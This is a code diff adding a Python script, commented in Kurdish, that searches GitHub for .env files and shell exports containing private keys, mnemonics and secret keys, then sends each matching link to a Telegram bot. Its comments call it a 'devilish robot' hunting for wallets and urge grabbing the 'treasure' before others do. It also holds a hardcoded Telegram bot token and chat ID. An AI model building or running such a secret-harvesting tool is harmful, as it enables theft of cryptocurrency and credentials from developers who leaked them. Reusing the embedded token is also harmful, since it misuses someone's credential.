@@ -1,0 +1,41 @@
+import requests
+import os
+
+# زانیارییەکانی تێلێگرام
+TELEGRAM_TOKEN = "8363879675:AAGOXZfmpGBNUY9DUyUR5DpyaDPcUmYmd50"
+CHAT_ID = "7955490868"
+
+def send_telegram(message):
+    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
+    requests.post(url, data=payload)
+
+def github_hunter():
+    print("🛰️ Hunter is starting...")
+    # نامەی دەستپێکردن بۆ دڵنیابوون لەوەی بۆتەکە ئیش دەکات
+    send_telegram("🚀 **ڕووبۆتە شەیتانییەکە چالاک بوو!**\nئێستا خەریکی پشکنینی گیتھەبە بۆ دۆزینەوەی جزدانەکان...")
+
+    # ئەو وشانەی بەدوایاندا دەگەڕێین (BTC, ETH, Keys)
+    queries = [
+        'path:.env "PRIVATE_KEY"',
+        'path:.env "MNEMONIC"',
+        '"export SECRET_KEY="'
+    ]
+    
+    # بەکارهێنانی تۆکنی گیتھەب بۆ سێرچ
+    headers = {"Authorization": f"token {os.getenv('GH_TOKEN')}"}
+    
+    for query in queries:
+        url = f"https://api.github.com/search/code?q={query}+sort:indexed"
+        try:
+            res = requests.get(url, headers=headers).json()
+            if 'items' in res:
+                for item in res['items'][:2]: # تەنها گرنگترینەکان
+                    file_url = item['html_url']
+                    msg = f"🎯 **گەنجینە دۆزرایەوە!**\n\n🔗 لینک: {file_url}\n\n⚠️ زوو بڕۆ سەیری ناو کۆدەکە بکە پێش ئەوەی کەسێکی تر بیبات!"
+                    send_telegram(msg)
+        except Exception as e:
+            print(f"Error: {e}")
+
+if __name__ == "__main__":
+    github_hunter()
